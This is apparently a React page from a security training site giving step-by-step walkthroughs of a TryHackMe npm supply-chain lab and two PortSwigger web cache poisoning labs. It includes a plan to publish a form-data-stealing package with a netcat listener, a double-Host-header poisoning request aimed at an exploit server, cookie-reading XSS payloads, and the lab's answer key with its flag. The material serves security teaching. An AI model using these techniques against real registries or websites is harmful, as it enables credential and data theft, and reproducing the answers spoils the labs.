import { useState } from 'react';
import { FiChevronRight, FiExternalLink } from 'react-icons/fi';
import CodeBlock from '../components/CodeBlock';

function LabStep({ num, title, children }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="lab-step">
      <div className="lab-step-header" onClick={() => setOpen(!open)}>
        <span className="lab-step-num">{num}</span>
        <span className="lab-step-title">{title}</span>
        <FiChevronRight className={`lab-step-chevron${open ? ' open' : ''}`} />
      </div>
      {open && <div className="lab-step-body">{children}</div>}
    </div>
  );
}

export default function Labs() {
  return (
    <div className="page">
      <div className="page-header">
        <div className="page-tag">Part 4</div>
        <h1>Hands-On Labs</h1>
        <p>Step-by-step walkthrough guides for TryHackMe and PortSwigger labs covering supply chain attack concepts.</p>
      </div>

      {/* TryHackMe Lab */}
      <div className="lab-card">
        <div className="lab-card-header">
          <div>
            <h3>TryHackMe: Supply Chain Attack &mdash; Lottie</h3>
            <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginTop: 4 }}>
              Based on the real-world Lottie Player npm package compromise (October 2024)
            </p>
          </div>
          <div className="lab-meta">
            <span className="lab-badge free">Free</span>
            <span className="lab-badge easy">Easy</span>
            <a href="https://tryhackme.com/room/supplychainattacks" target="_blank" rel="noopener noreferrer" className="btn btn-outline" style={{ padding: '4px 14px', fontSize: '0.82rem' }}>
              Open Lab <FiExternalLink />
            </a>
          </div>
        </div>
        <div className="lab-steps">
          <LabStep num={1} title="Start the Machine">
            <p>Click "Start Machine" at the top of the task. If using OpenVPN, connect to TryHackMe's VPN. Alternatively, launch the AttackBox directly in the browser.</p>
          </LabStep>
          <LabStep num={2} title="Task 2: Understand the Lottie Attack">
            <p>
              Read about how the Lottie Player npm package was compromised. The attacker stole
              an npm access token and published malicious versions that injected a crypto wallet drainer.
            </p>
            <p>Key facts to find:</p>
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '3px 0' }}>&gt; The vulnerable version was <code>2.0.5</code></li>
              <li style={{ padding: '3px 0' }}>&gt; The C2 server (defanged) is <code>castleservices01[.]com</code></li>
            </ul>
          </LabStep>
          <LabStep num={3} title="Task 3: Explore the Environment">
            <p>
              The machine runs a simulated npm registry (<code>npm.thm</code>) and a web application
              that uses a form validator package. Your goal is to create and publish a malicious version.
            </p>
            <p>Find the form validator JavaScript file: <code>form-validator.bundle.js</code></p>
          </LabStep>
          <LabStep num={4} title="Create the Malicious Package">
            <p>
              Modify the form validator to exfiltrate form submissions. The malicious version
              should still function as a validator (stealth) but also capture and send form data
              to your listener.
            </p>
            <CodeBlock
              language="javascript"
              filename="malicious form-validator"
              code={`// Intercept form submissions
// Send captured data to attacker on port 9090
// Package version: 1.1.0`}
            />
          </LabStep>
          <LabStep num={5} title="Publish & Exploit">
            <p>Publish the malicious package and set up your listener:</p>
            <CodeBlock
              language="bash"
              filename="terminal"
              code={`# Publish malicious version to npm.thm
npm publish --registry http://npm.thm

# Set up listener for exfiltrated data
nc -lvnp 9090`}
            />
            <p>Visit the web application, submit a form, and check your listener for the flag.</p>
          </LabStep>
          <LabStep num={6} title="Answers Reference">
            <div className="lab-answers">
              <h4>Task Answers (for preparation)</h4>
              <table>
                <thead>
                  <tr><th>Question</th><th>Answer</th></tr>
                </thead>
                <tbody>
                  <tr><td>Vulnerable version</td><td><code>2.0.5</code></td></tr>
                  <tr><td>C2 server (defanged)</td><td><code>castleservices01[.]com</code></td></tr>
                  <tr><td>Package version on npm.thm</td><td><code>1.1.0</code></td></tr>
                  <tr><td>Exfiltration port</td><td><code>9090</code></td></tr>
                  <tr><td>JS file name</td><td><code>form-validator.bundle.js</code></td></tr>
                  <tr><td>Flag</td><td><code>THM&#123;MALICIOUS_PACKAGE_UPLOADED007&#125;</code></td></tr>
                </tbody>
              </table>
            </div>
          </LabStep>
        </div>
      </div>

      {/* PortSwigger Lab 1 */}
      <div className="lab-card">
        <div className="lab-card-header">
          <div>
            <h3>PortSwigger: Web Cache Poisoning via Ambiguous Requests</h3>
            <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginTop: 4 }}>
              Supply chain adjacent &mdash; poisoning cached JavaScript served to all users
            </p>
          </div>
          <div className="lab-meta">
            <span className="lab-badge free">Free</span>
            <span className="lab-badge medium">Practitioner</span>
            <a href="https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests" target="_blank" rel="noopener noreferrer" className="btn btn-outline" style={{ padding: '4px 14px', fontSize: '0.82rem' }}>
              Open Lab <FiExternalLink />
            </a>
          </div>
        </div>
        <div className="lab-steps">
          <LabStep num={1} title="Explore and Proxy Traffic">
            <p>Access the lab, open Burp Suite, and proxy traffic through it. Look at the homepage response &mdash; it loads <code>/resources/js/tracking.js</code>.</p>
          </LabStep>
          <LabStep num={2} title="Identify Cache Behavior">
            <p>Send the homepage request to Repeater. Resend and observe the <code>X-Cache</code> header:</p>
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '3px 0' }}>&gt; <code>X-Cache: miss</code> &mdash; fetched from origin</li>
              <li style={{ padding: '3px 0' }}>&gt; <code>X-Cache: hit</code> &mdash; served from cache</li>
            </ul>
          </LabStep>
          <LabStep num={3} title="Exploit the Ambiguity">
            <p>Add a second Host header pointing to your exploit server:</p>
            <CodeBlock
              language="http"
              filename="Burp Repeater"
              code={`GET / HTTP/2
Host: LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER.exploit-server.net`}
            />
            <p>The cache keys on the first Host, but the backend uses the second &mdash; the script tag now loads from YOUR server.</p>
          </LabStep>
          <LabStep num={4} title="Set Up Exploit Server">
            <p>On your exploit server, create <code>/resources/js/tracking.js</code> with body: <code>alert(document.cookie)</code></p>
          </LabStep>
          <LabStep num={5} title="Poison the Cache & Solve">
            <p>Keep sending the double-Host request until you see <code>X-Cache: hit</code>. Then visit the homepage normally &mdash; the cached poisoned response loads your JavaScript. Lab solved!</p>
          </LabStep>
        </div>
      </div>

      {/* PortSwigger Lab 2 */}
      <div className="lab-card">
        <div className="lab-card-header">
          <div>
            <h3>PortSwigger: Cache Poisoning via DOM Vulnerability</h3>
            <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginTop: 4 }}>
              Poisoning JavaScript data sources via X-Forwarded-Host
            </p>
          </div>
          <div className="lab-meta">
            <span className="lab-badge free">Free</span>
            <span className="lab-badge hard">Expert</span>
            <a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria" target="_blank" rel="noopener noreferrer" className="btn btn-outline" style={{ padding: '4px 14px', fontSize: '0.82rem' }}>
              Open Lab <FiExternalLink />
            </a>
          </div>
        </div>
        <div className="lab-steps">
          <LabStep num={1} title="Discover Unkeyed Headers with Param Miner">
            <p>Install the Param Miner Burp extension. Right-click the homepage request and use "Guess headers" to discover that <code>X-Forwarded-Host</code> is an unkeyed input.</p>
          </LabStep>
          <LabStep num={2} title="Analyze the Vulnerable Code">
            <p>The page uses <code>X-Forwarded-Host</code> to set a <code>data.host</code> variable, which controls where a JSON file is loaded from via <code>initGeoLocate()</code>.</p>
          </LabStep>
          <LabStep num={3} title="Create Malicious JSON">
            <p>On your exploit server, create <code>/resources/json/geolocate.json</code> with <code>Access-Control-Allow-Origin: *</code> header and XSS payload in the country field.</p>
            <CodeBlock
              language="json"
              filename="geolocate.json"
              code={`{
  "country": "<img src=x onerror=alert(document.cookie)>"
}`}
            />
          </LabStep>
          <LabStep num={4} title="Poison and Solve">
            <p>Send the request with <code>X-Forwarded-Host: YOUR-EXPLOIT-SERVER</code> until it's cached. Visit the homepage normally &mdash; the DOM XSS triggers. Lab solved!</p>
          </LabStep>
        </div>
      </div>
    </div>
  );
}
